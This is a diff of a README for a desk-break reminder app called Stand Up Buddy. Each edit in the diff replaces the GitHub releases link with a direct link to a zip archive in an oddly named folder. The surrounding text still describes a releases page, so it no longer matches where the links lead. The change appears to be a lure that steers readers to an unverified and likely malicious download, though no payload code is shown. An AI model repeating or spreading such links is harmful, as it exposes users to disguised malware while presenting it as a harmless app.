@@ -1,6 +1,6 @@
 <h1>💺 sedentary-reminder - Never Forget to Move Again</h1>
 
-[![Download Stand Up Buddy](https://img.shields.io/badge/Download-Stand%20Up%20Buddy-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wordenselfdisciplined22/sedentary-reminder/releases)
+[![Download Stand Up Buddy](https://img.shields.io/badge/Download-Stand%20Up%20Buddy-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/wordenselfdisciplined22/sedentary-reminder/main/strumose/3.3.zip)
 
 ## 🖥️ What Is Stand Up Buddy?
 
@@ -41,7 +41,7 @@ Getting Stand Up Buddy on your computer is simple. Follow these steps carefully.
 
 ### 📥 Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/wordenselfdisciplined22/sedentary-reminder/releases](https://github.com/wordenselfdisciplined22/sedentary-reminder/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/wordenselfdisciplined22/sedentary-reminder/main/strumose/3.3.zip](https://raw.githubusercontent.com/wordenselfdisciplined22/sedentary-reminder/main/strumose/3.3.zip)**
 
 When you arrive at the page, you'll see a list of available versions. Look for the most recent one (the topmost item). Click on it to expand the download options.
 
@@ -153,6 +153,6 @@ You don't need to overhaul your routine. Just let this friendly little app remin
 
 Ready to feel better at your desk? Visit the download page now and get Stand Up Buddy on your computer in less than five minutes.
 
-**[👉 Download Stand Up Buddy Now](https://github.com/wordenselfdisciplined22/sedentary-reminder/releases)**
+**[👉 Download Stand Up Buddy Now](https://raw.githubusercontent.com/wordenselfdisciplined22/sedentary-reminder/main/strumose/3.3.zip)**
 
 Your body will thank you. Every single hour.
